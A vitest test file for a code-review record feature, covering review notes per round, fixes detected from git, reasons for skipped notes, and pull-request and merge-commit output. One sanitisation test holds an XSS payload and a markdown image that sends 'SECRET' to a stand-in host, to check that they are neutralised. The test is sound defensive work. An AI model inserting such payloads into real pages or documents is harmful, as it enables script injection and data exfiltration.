import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execSync } from 'node:child_process';
import type { MergeState, PullRequestReview, RepoHost } from '../src/modules/code-host/types.js';

/**
 * The review as a record (ADR-007): the Reviewer's notes per round with file and line, each note fixed (from git, or the
 * Reviewer's word when git cannot tell), gone past with the person's reason, or open; old stories' plain notes; and the
 * record in the pull request's description and threads, or in the local merge's commit message. Writing it into the pull
 * request never holds up the merge.
 */

/**
 * The code host the story's pull request is on, when the test gives one; what it was asked to write; whether it says
 * no to the review; where its pull request stands, and whether it merges it.
 */
let host: RepoHost | null = null;
const written: PullRequestReview[] = [];
let refuse = false;
let hostState: MergeState = 'mergeable';
let mergeFails = false;
function fakeHost(): RepoHost {
  return {
    host: 'example',
    label: 'Example Repos',
    repo: 'app',
    abilities: { attachImages: false },
    gitEnv: () => ({}),
    findPullRequest: async () => null,
    openPullRequest: async () => ({ id: 7, url: 'https://code.example.test/pr/7' }),
    attachImage: async () => '',
    updateDescription: async () => undefined,
    mergeState: async () => hostState,
    merge: async () => {
      if (mergeFails) throw new Error('It waits for a required reviewer.');
      hostState = 'merged';
      return { commit: 'm1' };
    },
    close: async () => undefined,
    refusedPush: () => false,
    postReview: async (_id, review) => {
      if (refuse) throw Object.assign(new Error('Example Repos said no to this. An engineer can see why in the log.'), { kind: 'other' });
      written.push(review);
      return { threads: review.threads.length };
    },
  };
}
vi.mock('../src/modules/registry.js', async (orig) => ({
  ...(await orig<typeof import('../src/modules/registry.js')>()),
  repoHostFor: () => host,
}));

const { boardPaths, readMeta, readTicket, requireTicket, updateTicket, writeMeta } = await import('../src/board/store.js');
const actions = await import('../src/board/actions.js');
const { addWorktree } = await import('./support/copy.js');
const { readAnswer, recordRound, reviewAnswerProblem, withOldNotes } = await import('../src/engine/review-record/notes.js');
const { fixRound } = await import('../src/engine/review-record/fix-round.js');
const { notesAsk } = await import('../src/engine/review-record/prompt.js');
const { lineNow, readDiff, touchedNotes } = await import('../src/engine/review-record/git-fixed.js');
const { reviewView } = await import('../src/engine/review-record/view.js');
const { goPast, writeReviewAgain } = await import('../src/engine/review-record/actions.js');
const { prDescription } = await import('../src/engine/review-record/pr-description.js');
const { reviewCommitBody } = await import('../src/engine/review-record/commit-body.js');
const { reviewDoc, parseReviewDoc } = await import('../src/board/review-doc.js');
const { publishTicket } = await import('../src/engine/publish.js');
const { lookOutside } = await import('../src/engine/merged-outside.js');
const { reviewForHost } = await import('../src/engine/review-record/write.js');
const { plainMarkdown } = await import('../src/core/safe-markdown.js');
const P = await import('../src/engine/prompts.js');

let tmp: string;
let project: string;
let bp: ReturnType<typeof boardPaths>;
const sh = (cmd: string, cwd: string) => execSync(cmd, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const lines = (n: number, name: string) => Array.from({ length: n }, (_, i) => `export const ${name}${i + 1} = ${i + 1};`).join('\n') + '\n';

beforeEach(() => {
  host = null;
  written.length = 0;
  refuse = false;
  hostState = 'mergeable';
  mergeFails = false;
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'squad-review-record-')));
  const remote = path.join(tmp, 'remote.git');
  sh(`git init -q --bare -b main ${remote}`, tmp);
  project = path.join(tmp, 'app');
  fs.mkdirSync(project);
  sh('git init -q -b main', project);
  fs.writeFileSync(path.join(project, 'charge.ts'), lines(20, 'c'));
  fs.writeFileSync(path.join(project, 'release.ts'), lines(40, 'r'));
  sh('git add -A && git commit -qm start', project);
  sh(`git remote add origin ${remote} && git push -q origin main`, project);
  bp = boardPaths(path.join(project, '.squad'));
  writeMeta(bp, {
    project: 'App',
    key: 'AP',
    nextNumber: 1,
    engine: 'live',
    runner: 'direct',
    user: { name: 'Momen', role: 'Project manager' },
    roles: { analyst: 'Claude', architect: 'Claude', builder: 'Claude', tester: 'Claude', reviewer: 'Claude' },
    tools: [],
    speed: 1,
    map: [],
    lessons: [],
    commands: {},
    git: { base: 'main', remote: 'origin' },
    scan: { status: 'done', empty: false },
  });
});

afterEach(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
});

/** A story built in its own copy, not saved yet, as the Reviewer reads it. */
function built(): { id: string; dir: string } {
  const t = actions.createTicket(bp, { title: 'Pay by card' });
  const wt = addWorktree(project, t.id, 'main');
  fs.writeFileSync(path.join(wt.dir, 'charge.ts'), lines(20, 'c').replace('c3 = 3', 'c3 = 30'));
  updateTicket(bp, t.id, (x) => {
    x.stage = 'review';
    x.worktree = wt.dir;
    x.branch = wt.branch;
    x.baseCommit = wt.baseCommit;
    x.story = 'Customers pay by card when they confirm a booking.';
    x.criteria = [
      { given: 'I confirm a booking', when: 'I pay by card', then: 'I see Paid and my receipt number' },
      { given: 'the payment goes through', when: 'the booking is saved', then: 'it is saved as paid' },
    ];
  });
  return { id: t.id, dir: wt.dir };
}

/** The Reviewer's answer, saved as the review step saves it. */
function reviewed(id: string, answer: { approved: boolean; notes?: unknown; earlier?: unknown; comments?: string[] }, extra: string[] = []): string[] {
  const out = { comments: [], ...answer } as { approved: boolean; comments: string[]; notes?: unknown; earlier?: unknown };
  const said = readAnswer(out, readTicket(bp, id)!.worktree);
  out.comments = [...out.comments, ...extra];
  updateTicket(bp, id, (x) => recordRound(x, out, said));
  return out.comments;
}

describe("the Reviewer's notes, round by round", () => {
  it('keeps each note with its file and line, numbered across the rounds, and says where each points', () => {
    const { id, dir } = built();
    const comments = reviewed(
      id,
      {
        approved: false,
        notes: [
          { file: './charge.ts', line: 3, text: 'Round once, after tax.' },
          { file: path.join(dir, 'release.ts'), text: 'The 15 minutes start at page open.' },
          { text: 'Add a test for a refund.', line: 9 },
          { file: 'x.ts', text: '  ' },
        ],
      },
      ['Your team\'s checklist "Money" asks: Is every amount rounded once? The answer is no.'],
    );
    // The Builder gets where each note points, and the team's checklist answer too.
    expect(comments).toEqual(['charge.ts line 3: Round once, after tax.', 'release.ts: The 15 minutes start at page open.', 'Add a test for a refund.', 'Your team\'s checklist "Money" asks: Is every amount rounded once? The answer is no.']);
    reviewed(id, { approved: true, notes: [{ file: 'charge.ts', line: 18, text: 'A name could be clearer.' }] });
    const t = requireTicket(bp, id);
    expect(t.review!.rounds.map((r) => [r.n, r.approved, r.notes.map((n) => n.n)])).toEqual([
      [1, false, [1, 2, 3, 4]],
      [2, true, [5]],
    ]);
    expect(t.review!.rounds[0]!.notes[0]).toMatchObject({ n: 1, file: 'charge.ts', line: 3, text: 'Round once, after tax.' });
    // A whole file has no line; the whole change has neither, even when a line was given.
    expect(t.review!.rounds[0]!.notes[1]).toEqual({ n: 2, file: 'release.ts', text: 'The 15 minutes start at page open.' });
    expect(t.review!.rounds[0]!.notes[2]).toEqual({ n: 3, text: 'Add a test for a refund.' });
    // Written to review.md and read back from it.
    expect(fs.readFileSync(path.join(bp.ticketsDir, id, 'review.md'), 'utf8')).toContain('1. charge.ts line 3: Round once, after tax.');
    expect(reviewView(t).counts).toEqual({ notes: 5, fixed: 0, past: 0, open: 5 });
  });

  it('reads an answer of the older shape, with plain comments, as notes with no file', () => {
    const { id } = built();
    expect(reviewed(id, { approved: false, comments: ['Count per day, not per week.'] })).toEqual(['Count per day, not per week.']);
    expect(requireTicket(bp, id).review!.rounds[0]!.notes).toEqual([{ n: 1, text: 'Count per day, not per week.' }]);
  });

  it('asks the Reviewer for file and line in the answer shape and the brief, which the Harness shows', () => {
    expect(Object.keys(P.REVIEW_SCHEMA.properties)).toEqual(expect.arrayContaining(['notes', 'earlier']));
    expect(P.REVIEW_SCHEMA.required).toEqual(['approved', 'summary']);
    const { id } = built();
    const brief = P.reviewPrompt(readMeta(bp), [], requireTicket(bp, id), 1);
    expect(brief).toContain('Write each problem in notes: one concrete sentence, the file it is in (its path from this folder) and the');
    expect(brief).not.toContain('could not tell');
  });
});

describe('fixed, read from git', () => {
  it('a note whose lines the fix changed is fixed in that commit; the others wait for the Reviewer, who may reopen', async () => {
    const { id, dir } = built();
    reviewed(id, {
      approved: false,
      notes: [
        { file: 'charge.ts', line: 3, text: 'Round once, after tax.' },
        { file: 'release.ts', line: 30, text: 'The 15 minutes start at page open.' },
        { text: 'Add a test for a refund.' },
      ],
    });
    await fixRound(bp, id, async () => {
      fs.writeFileSync(path.join(dir, 'charge.ts'), fs.readFileSync(path.join(dir, 'charge.ts'), 'utf8').replace('c4 = 4', 'c4 = 40'));
      fs.writeFileSync(path.join(dir, 'release.ts'), lines(40, 'r').replace('r2 = 2', 'r2 = 20'));
    });
    const t = requireTicket(bp, id);
    const r = t.review!.rounds[0]!;
    const head = sh('git rev-parse --short=7 HEAD', dir);
    expect(r.fix).toEqual({ '.': head });
    expect(r.read!['.']).toBe(sh('git rev-parse --short=7 HEAD~1', dir));
    expect(r.notes.map((n) => n.fixed)).toEqual([{ commit: head, by: 'git' }, undefined, undefined]);
    expect(sh('git log --format=%s -2', dir).split('\n')).toEqual([`The Builder's changes after review round 1 (${id})`, `Work so far on Pay by card (${id}), as the Reviewer read it in round 1`]);
    expect(t.activity[0]!.text).toBe(`Saved the Builder's changes after review round 1 as ${head}: 1 of 3 notes changed where they point. The Reviewer checks them in its next round`);

    // Round 2: the Reviewer confirms the fix git found, and says about the two git could not settle, by number.
    const ask = notesAsk(t);
    expect(ask).toContain('squad-kit saw the Builder change the lines of these earlier notes, so it counts them as fixed:\n1. charge.ts line 3: Round once, after tax.');
    expect(ask).toContain('squad-kit could not tell whether these earlier notes are fixed:\n2. release.ts line 30: The 15 minutes start at page open.\n3. Add a test for a refund.');
    // It says 2 is fixed and 3 is not: 3 goes back to the Builder with the new notes, and is not counted twice.
    const comments = reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 9, text: 'Keep the cents.' }], earlier: [{ n: 2, fixed: true }, { n: 3, fixed: false }] });
    expect(comments).toEqual(['charge.ts line 9: Keep the cents.', 'Add a test for a refund.']);
    const v = reviewView(requireTicket(bp, id));
    expect(v.rounds[0]!.notes.map((n) => [n.n, n.state, n.fixed?.by, n.fixed?.checked])).toEqual([
      [1, 'fixed', 'git', true],
      [2, 'fixed', 'reviewer', true],
      [3, 'open', undefined, undefined],
    ]);
    expect(v.counts).toEqual({ notes: 4, fixed: 2, past: 0, open: 2 });
    expect(v.fixes).toEqual([head]);
    // Asked once: a checked fix is not asked about again.
    expect(notesAsk(requireTicket(bp, id))).not.toContain('1. charge.ts');
  });

  it('the Reviewer reopens a fix git found: it is open again, and back to the Builder', async () => {
    const { id, dir } = built();
    reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 3, text: 'Round once, after tax.' }] });
    await fixRound(bp, id, async () => fs.writeFileSync(path.join(dir, 'charge.ts'), fs.readFileSync(path.join(dir, 'charge.ts'), 'utf8').replace('c3 = 30', 'c3 = 31')));
    expect(reviewView(requireTicket(bp, id)).rounds[0]!.notes[0]!.state).toBe('fixed');
    expect(reviewed(id, { approved: false, notes: [], earlier: [{ n: 1, fixed: false }] })).toEqual(['charge.ts line 3: Round once, after tax.']);
    expect(reviewView(requireTicket(bp, id)).rounds[0]!.notes[0]).toMatchObject({ state: 'open' });
  });

  it('one change settles only the note it touches, never a removed file, and the Builder’s own commits count', async () => {
    const { id, dir } = built();
    fs.writeFileSync(path.join(dir, 'old.ts'), 'export const old = 1;\n');
    reviewed(id, {
      approved: false,
      notes: [
        { file: 'charge.ts', line: 10, text: 'Name it total.' },
        { file: 'charge.ts', line: 12, text: 'Round it.' },
        { file: 'old.ts', line: 1, text: 'This is not used.' },
      ],
    });
    await fixRound(bp, id, async () => {
      fs.writeFileSync(path.join(dir, 'charge.ts'), fs.readFileSync(path.join(dir, 'charge.ts'), 'utf8').replace('c10 = 10', 'c10 = 100'));
      fs.rmSync(path.join(dir, 'old.ts'));
      // The Builder saved its work itself: squad-kit has nothing left to save, and still reads what changed.
      sh('git add -A && git commit -qm "builder saved it"', dir);
    });
    const r = requireTicket(bp, id).review!.rounds[0]!;
    expect(r.notes.map((n) => n.fixed?.commit ?? null)).toEqual([sh('git rev-parse --short=7 HEAD', dir), null, null]);
    expect(r.fix).toEqual({ '.': sh('git rev-parse --short=7 HEAD', dir) });
  });

  it('a note about a whole file needs a real change in it and the Reviewer’s word', async () => {
    const { id, dir } = built();
    reviewed(id, { approved: false, notes: [{ file: 'release.ts', text: 'Split this file.' }, { file: 'charge.ts', text: 'Name it better.' }] });
    await fixRound(bp, id, async () => fs.writeFileSync(path.join(dir, 'release.ts'), lines(40, 'r').replace('r9 = 9', 'r9 = 90')));
    const head = sh('git rev-parse --short=7 HEAD', dir);
    expect(requireTicket(bp, id).review!.rounds[0]!.notes.map((n) => [n.fixed, n.touched])).toEqual([
      [undefined, head],
      [undefined, undefined],
    ]);
    expect(notesAsk(requireTicket(bp, id))).toContain(`1. release.ts: Split this file. (its place changed in ${head})`);
    // The Reviewer says both are fixed: only the one whose file really changed is.
    reviewed(id, { approved: true, notes: [], earlier: [{ n: 1, fixed: true }, { n: 2, fixed: true }] });
    expect(reviewView(requireTicket(bp, id)).rounds[0]!.notes.map((n) => [n.state, n.fixed?.commit])).toEqual([
      ['fixed', head],
      ['open', undefined],
    ]);
  });

  it('a change you ask for after an approval only marks its open note, for the Reviewer to call; with nothing open, nothing extra is saved', async () => {
    const { id, dir } = built();
    reviewed(id, { approved: true, notes: [{ file: 'release.ts', line: 30, text: 'Say the minutes in the name.' }] });
    await fixRound(bp, id, async () => fs.writeFileSync(path.join(dir, 'release.ts'), lines(40, 'r').replace('r31 = 31', 'r31 = 310')));
    const head = sh('git rev-parse --short=7 HEAD', dir);
    expect(reviewView(requireTicket(bp, id)).rounds[0]!.notes[0]).toMatchObject({ state: 'open', touched: head });
    reviewed(id, { approved: true, notes: [], earlier: [{ n: 1, fixed: true }] });
    expect(reviewView(requireTicket(bp, id)).rounds[0]!.notes[0]).toMatchObject({ state: 'fixed', fixed: { commit: head, by: 'reviewer' } });
    // The next round of the Builder has nothing open to settle: no commits of squad-kit's own.
    const before = sh('git rev-list --count HEAD', dir);
    await fixRound(bp, id, async () => fs.writeFileSync(path.join(dir, 'charge.ts'), 'export const c = 1;\n'));
    expect(sh('git rev-list --count HEAD', dir)).toBe(before);
    expect(sh('git status --short', dir)).toBe('M charge.ts');
  });

  it('reads a diff with no context lines: removed files, exact and near changes, and where a line is now', () => {
    const diff = ['diff --git a/a.ts b/a.ts', '--- a/a.ts', '+++ b/a.ts', '@@ -10,2 +10,3 @@', '-x', '-y', '+x', '+y', '+z', '@@ -40,0 +42,4 @@', '+w', 'diff --git a/gone.ts b/gone.ts', 'deleted file mode 100644', '--- a/gone.ts', '+++ /dev/null', '@@ -1,3 +0,0 @@'].join('\n');
    const files = readDiff(diff);
    expect(files).toEqual([
      { from: 'a.ts', to: 'a.ts', deleted: false, ranges: [[10, 11], [40, 41]] },
      { from: 'gone.ts', deleted: true, ranges: [[1, 3]] },
    ]);
    const note = (n: number, file: string, line?: number) => ({ n, file, ...(line ? { line } : {}) });
    // Exact overlap wins; with none, only the nearest within 2 lines.
    expect([...touchedNotes([note(1, 'a.ts', 11), note(2, 'a.ts', 12)], files)]).toEqual([1]);
    expect([...touchedNotes([note(1, 'a.ts', 13), note(2, 'a.ts', 14)], files)]).toEqual([1]);
    expect([...touchedNotes([note(1, 'a.ts', 25)], files)]).toEqual([]);
    expect([...touchedNotes([note(1, 'a.ts')], files)]).toEqual([1]);
    expect([...touchedNotes([note(1, 'gone.ts', 2), note(2, 'gone.ts')], files)]).toEqual([]);
    expect([...touchedNotes([{ n: 1 }], files)]).toEqual([]);
    expect(lineNow(5, 'a.ts', diff)).toBe(5);
    expect(lineNow(11, 'a.ts', diff)).toBe(10);
    expect(lineNow(30, 'a.ts', diff)).toBe(31);
    expect(lineNow(41, 'a.ts', diff)).toBe(46);
  });

  it('a copy git cannot save in leaves the notes open, and the fix still runs', async () => {
    const { id } = built();
    reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 3, text: 'Round once.' }] });
    const elsewhere = path.join(tmp, 'not-a-repo');
    fs.mkdirSync(elsewhere);
    updateTicket(bp, id, (x) => (x.worktree = elsewhere));
    let ran = false;
    await fixRound(bp, id, async () => {
      ran = true;
    });
    expect(ran).toBe(true);
    expect(reviewView(requireTicket(bp, id)).counts.open).toBe(1);
  });

  it('an answer that asks for changes but names none is asked again, then stops the step, never an empty fix', () => {
    expect(reviewAnswerProblem({ approved: false, summary: 'No', notes: [] })).toBe('approved is false, and notes names nothing to change');
    expect(reviewAnswerProblem({ approved: false, summary: '', notes: [], question: { text: 'Count cancelled ones?', kind: 'gap' } })).toBeNull();
    expect(reviewAnswerProblem({ approved: false, summary: '', notes: [], earlier: [{ n: 1, fixed: false }] })).toBeNull();
    expect(reviewAnswerProblem({ approved: false, summary: '', comments: ['Round it.'] })).toBeNull();
    expect(reviewAnswerProblem({ approved: true, summary: 'Fine' })).toBeNull();
    expect(() => readAnswer({ approved: false, comments: [], notes: [] })).toThrow('The Reviewer asked for changes but did not say which. Press Try again.');
  });
});

describe('going past a note', () => {
  it('is the person’s alone, with a reason on the record, before Looks right', () => {
    const { id } = built();
    reviewed(id, { approved: true, notes: [{ file: 'charge.ts', line: 3, text: 'Move the money formatting into one shared helper.' }] });
    expect(() => goPast(bp, id, 1, '  ')).toThrow(/Write why/);
    expect(() => goPast(bp, id, 9, 'later')).toThrow(/has no review note 9/);
    const v = goPast(bp, id, 1, 'Later, in AP-30 (prices page)');
    expect(v.rounds[0]!.notes[0]).toMatchObject({ state: 'past', past: { by: 'Momen', reason: 'Later, in AP-30 (prices page)' } });
    expect(requireTicket(bp, id).activity[0]!.text).toBe('Went past review note 1. Why: Later, in AP-30 (prices page)');
    expect(() => goPast(bp, id, 1, 'again')).toThrow(/went past note 1 already/);
    updateTicket(bp, id, (x) => (x.stage = 'release'));
    expect(reviewView(requireTicket(bp, id)).canPast).toBe(false);
  });

  it('Continue anyway on the review stop goes past the notes it left open, with that reason', () => {
    const { id } = built();
    reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 3, text: 'Round once.' }, { text: 'Name it better.' }] });
    updateTicket(bp, id, (x) => {
      x.review!.rounds[0]!.notes[0]!.fixed = { commit: 'abc1234', by: 'git' };
      x.overrides = [{ gate: 'review', reason: 'The name is the client’s word', by: 'Momen', at: new Date(Date.now() + 1000).toISOString() }];
    });
    const v = reviewView(requireTicket(bp, id));
    expect(v.rounds[0]!.notes.map((n) => n.state)).toEqual(['fixed', 'past']);
    expect(v.rounds[0]!.notes[1]!.past?.reason).toBe('The name is the client’s word');
    expect(notesAsk(requireTicket(bp, id))).not.toContain('Name it better');
  });
});

describe('old stories', () => {
  it('with plain review notes read as round 1, with no file and line', () => {
    const t = { createdAt: '2026-11-01T10:00:00.000Z', reviewNotes: ['Count per day.', 'Add a test.'], stage: 'review' as const };
    const v = reviewView(t);
    expect(v.old).toBe(true);
    expect(v.rounds).toHaveLength(1);
    expect(v.rounds[0]!.notes.map((n) => [n.n, n.file, n.state, n.text])).toEqual([
      [1, undefined, 'open', 'Count per day.'],
      [2, undefined, 'open', 'Add a test.'],
    ]);
    expect(withOldNotes({ createdAt: t.createdAt })).toBeUndefined();
    expect(reviewView({ createdAt: t.createdAt, stage: 'review' }).rounds).toEqual([]);
  });

  it('review.md reads back what it wrote, and a header with nothing in it reads as no review', () => {
    const record = { rounds: [{ n: 1, at: '2026-11-13T10:02:00.000Z', approved: false, notes: [{ n: 1, file: 'a.ts', line: 4, text: 'Round once.', fixed: { commit: 'a3f9c21', by: 'git' as const } }], fix: { '.': 'a3f9c21' } }], looksRight: { by: 'Momen', at: '2026-11-13T10:42:00.000Z' } };
    const doc = reviewDoc('Pay by card', record);
    expect(doc).toContain('1. a.ts line 4: Round once. \\(fixed in a3f9c21\\)');
    expect(doc).toContain('Momen approved: Looks right, 13 Nov 2026');
    expect(parseReviewDoc(doc)).toEqual({ review: record });
    expect(parseReviewDoc('---\nrounds: []\n---\n# x\n')).toEqual({});
  });
});

describe('the record in the pull request', () => {
  function readyWithReview(): string {
    const { id, dir } = built();
    reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 3, text: 'Round once, after tax.' }, { file: 'charge.ts', line: 12, text: 'Move the money formatting into one shared helper.' }] });
    updateTicket(bp, id, (x) => {
      x.review!.rounds[0]!.notes[0]!.fixed = { commit: 'a3f9c21', by: 'git' };
      x.review!.rounds[0]!.fix = { '.': 'a3f9c21' };
      x.review!.rounds[0]!.notes[1]!.past = { by: 'Momen', reason: 'later, in AP-30 (prices page)', at: '2026-11-13T09:00:00.000Z' };
    });
    reviewed(id, { approved: true, notes: [] });
    sh('git add -A && git commit -qm build', dir);
    updateTicket(bp, id, (x) => (x.review!.looksRight = { by: 'Momen', at: '2026-11-13T10:42:00.000Z' }));
    return id;
  }

  it('the description holds what was asked, each "done when" with its kind and proof, the review, the notes gone past and the approval', () => {
    const id = readyWithReview();
    const saved = requireTicket(bp, id);
    // Each line's kind is the spec's (board/proof-kind.ts), saved there by its own step.
    const t = { ...saved, criteria: saved.criteria!.map((c, i) => ({ ...c, proof: { kind: i === 0 ? ('screen' as const) : ('data' as const) } })) };
    const md = prDescription(t, { ref: 'AB#21' }, [{ label: 'I see Paid and my receipt number', url: 'https://code.example.test/att/after-1.png' }]);
    expect(md).toContain('### What was asked\n\nCustomers pay by card when they confirm a booking.');
    // The item as its tracker writes it.
    expect(md).toContain('Work item: AB#21\n');
    expect(prDescription(t, { ref: '#40', closes: 'Closes #40' }, [])).toContain('Work item: #40\nCloses #40\n');
    expect(md).toContain('### Done when, with its proof\n- [x] `Screen` **Given** I confirm a booking, **when** I pay by card, **then** I see Paid and my receipt number · [proof](https://code.example.test/att/after-1.png)');
    expect(md).toContain('- [x] `Data` **Given** the payment goes through, **when** the booking is saved, **then** it is saved as paid\n');
    expect(md).toContain('### The review\n- Rounds: **2**\n- Notes: **2: 1 fixed, 1 you went past**\n- Builder changes after review: **1 commit** (a3f9c21)');
    expect(md).toContain('> **You went past 1 note**\n>\n> "charge.ts line 12: Move the money formatting into one shared helper."\n> Momen\'s reason: later, in AP-30 \\(prices page\\). Recorded on 13 Nov 2026');
    expect(md).toMatch(/\*\*Momen\*\* approved: Looks right, 13 Nov 2026 \d\d:\d\d/);
    expect(md).not.toMatch(/claude|\bai\b|codex/i);
    // Old specs have no kind: the line is written without one.
    const plain = prDescription({ ...t, criteria: t.criteria!.map(({ proof: _p, ...c }) => c) }, null, []);
    expect(plain).toContain('### Done when, with its proof\n- [x] **Given** I confirm a booking');
    expect(plain).not.toContain('`Screen`');
  });

  it('opens and merges the pull request, then writes a thread per note and who pressed Looks right', async () => {
    host = fakeHost();
    const id = readyWithReview();
    updateTicket(bp, id, (x) => (x.stage = 'release'));
    expect(await publishTicket(bp, id)).toEqual({ clash: false });
    const t = requireTicket(bp, id);
    expect(t.mergedAt).toBeTruthy();
    expect(written).toHaveLength(1);
    expect(written[0]!.threads.map((th) => [th.key, th.file, th.line, th.state])).toEqual([
      [`${id}#1`, 'charge.ts', 3, 'fixed'],
      [`${id}#2`, 'charge.ts', 12, 'past'],
    ]);
    expect(written[0]!.threads[0]!.text).toContain('Fixed in `a3f9c21`');
    expect(written[0]!.threads[1]!.text).toContain("Went past. Momen's reason: later, in AP-30 \\(prices page\\).");
    expect(written[0]!.approval!.text).toMatch(/^\*\*Momen\*\* pressed Looks right on the squad-kit board, .+ squad-kit wrote this for them: it cannot approve in their name\.$/);
    expect(t.reviewPosted).toMatchObject({ ok: true, pr: 7, threads: 2 });
  });

  it('a code host that says no never holds up the merge: the story says so, and Write it again writes it', async () => {
    host = fakeHost();
    refuse = true;
    const id = readyWithReview();
    updateTicket(bp, id, (x) => (x.stage = 'release'));
    expect(await publishTicket(bp, id)).toEqual({ clash: false });
    let t = requireTicket(bp, id);
    expect(t.mergedAt).toBeTruthy();
    expect(t.reviewPosted).toMatchObject({ ok: false, pr: 7, why: 'Example Repos said no to this. An engineer can see why in the log.' });
    expect(t.activity.some((a) => a.text.startsWith('Could not write the review into pull request 7 on Example Repos: Example Repos said no to this.') && a.text.includes(`squad review ${id} --write`))).toBe(true);
    expect(reviewView(t).posted?.ok).toBe(false);
    refuse = false;
    expect(reviewView(t).canWrite).toBe(true);
    expect(await writeReviewAgain(bp, id)).toMatchObject({ ok: true, threads: 2 });
    t = requireTicket(bp, id);
    expect(t.reviewPosted?.ok).toBe(true);
  });

  it('a pull request that is not merged gets no threads, nor Write it again; once the host merged it, they go in', async () => {
    host = fakeHost();
    mergeFails = true;
    hostState = 'waiting';
    const id = readyWithReview();
    updateTicket(bp, id, (x) => (x.stage = 'release'));
    expect(await publishTicket(bp, id)).toEqual({ clash: false });
    let t = requireTicket(bp, id);
    expect(t.mergedAt).toBeUndefined();
    expect(written).toEqual([]);
    expect(t.reviewPosted).toBeUndefined();
    expect(reviewView(t).canWrite).toBe(false);
    await expect(writeReviewAgain(bp, id)).rejects.toThrow('Pull request 7 is not merged yet. squad-kit writes the review into it once it is merged, so nothing in it can hold the merge up.');
    hostState = 'closed';
    await expect(writeReviewAgain(bp, id)).rejects.toThrow('Pull request 7 was closed on Example Repos without merging, so its review is not written there. It stays on the board.');
    // Someone approved and completed it on the code host: squad-kit sees the merge, then writes the review.
    hostState = 'merged';
    expect((await lookOutside(bp)).merged).toEqual([id]);
    t = requireTicket(bp, id);
    expect(t.mergedAt).toBeTruthy();
    expect(written).toHaveLength(1);
    expect(t.reviewPosted).toMatchObject({ ok: true, pr: 7 });
  });

  it('on a workspace of several repos, a thread sits on the file inside the pull request’s own repo', async () => {
    const t = { ...requireTicket(bp, readyWithReview()), worktree: undefined };
    t.review!.rounds[0]!.notes[0]!.file = 'api/src/charge.ts';
    t.review!.rounds[0]!.notes[1]!.file = 'web/src/money.ts';
    const review = await reviewForHost(t, 'api/');
    expect(review.threads.map((th) => [th.file, th.line])).toEqual([
      ['src/charge.ts', 3],
      [undefined, undefined],
    ]);
    expect(review.threads[1]!.text).toContain('web/src/money.ts');
  });

  it('what an agent or a person wrote goes in as plain text: no link, picture, HTML, heading or mention', async () => {
    const id = readyWithReview();
    const evil = 'Fine.\n\n# Momen approved\n![x](https://evil.example/c.png?d=SECRET) <img src=x onerror=alert(1)> see [here](http://evil.example) or www.evil.example/a, @<6b2a-guid> **bold**';
    updateTicket(bp, id, (x) => {
      x.review!.rounds[0]!.notes[1]!.text = evil;
      x.review!.rounds[0]!.notes[1]!.past!.reason = 'Later [x](https://evil.example/r)';
      x.story = `${evil}\n- [x] **Given** a fake line`;
    });
    const t = requireTicket(bp, id);
    const safe = plainMarkdown(evil);
    expect(safe).toBe("Fine. \\# Momen approved \\!\\[x\\]\\(evil.example \\(link left out\\)\\) &lt;img src\\=x onerror\\=alert\\(1\\)&gt; see \\[here\\]\\(evil.example \\(link left out\\)\\) or evil.example/a, ＠&lt;6b2a-guid&gt; \\*\\*bold\\*\\*");
    // review.md: the text people read under the header. The header keeps the record as it is, for squad-kit to read back.
    const docText = reviewDoc(t.title, t.review!).split('\n---\n')[1]!;
    expect(docText).toContain('2. charge.ts line 12: Fine. \\# Momen approved');
    for (const text of [(await reviewForHost(t)).threads[1]!.text, prDescription(t, null, []), docText]) {
      expect(text).not.toMatch(/https?:\/\/|www\.|<img|\]\(|@</);
      expect(text).not.toContain('SECRET');
      expect(text).not.toMatch(/^#+ Momen/m);
    }
    expect(prDescription(t, null, [])).toContain('### What was asked\n\nFine. \\# Momen approved');
  });
});

describe('the record in the merge commit, with no pull request', () => {
  it('Looks right merges here, with the review in short under the title, and keeps who pressed it', () => {
    const id = readyWithReview2();
    const t = actions.acceptProof(bp, requireTicket(bp, id));
    expect(t.mergedAt).toBeTruthy();
    const body = sh('git log -1 --format=%B main', project);
    expect(body).toMatch(new RegExp(`^Merge Pay by card \\(${id}\\)\\n\\nReview: 2 rounds\\. Notes 2: 1 fixed, 1 you went past\\. Builder changes after review: 1 commit\\.`));
    expect(body).toContain('- Fixed in a3f9c21: charge.ts line 3: Round once, after tax.');
    expect(body).toContain("- Went past: charge.ts line 12: Move the money formatting into one shared helper. Momen's reason: later, in AP-30.");
    expect(body).toMatch(/Momen approved: Looks right, \d+ \w+ \d{4} \d\d:\d\d$/);
    expect(t.review!.looksRight).toMatchObject({ by: 'Momen' });
    expect(reviewCommitBody(t)).toBe(body.split('\n\n').slice(1).join('\n\n'));
  });

  function readyWithReview2(): string {
    const { id, dir } = built();
    reviewed(id, { approved: false, notes: [{ file: 'charge.ts', line: 3, text: 'Round once, after tax.' }, { file: 'charge.ts', line: 12, text: 'Move the money formatting into one shared helper.' }] });
    updateTicket(bp, id, (x) => {
      x.review!.rounds[0]!.notes[0]!.fixed = { commit: 'a3f9c21', by: 'git' };
      x.review!.rounds[0]!.fix = { '.': 'a3f9c21' };
      x.review!.rounds[0]!.notes[1]!.past = { by: 'Momen', reason: 'later, in AP-30', at: '2026-11-13T09:00:00.000Z' };
    });
    reviewed(id, { approved: true, notes: [] });
    sh('git add -A && git commit -qm build', dir);
    updateTicket(bp, id, (x) => {
      x.stage = 'review';
      x.waiting = { kind: 'proof', summary: 'Check the proof' };
      x.gates = { checks: 'pass', review: 'pass', proof: 'pass' };
    });
    return id;
  }
});
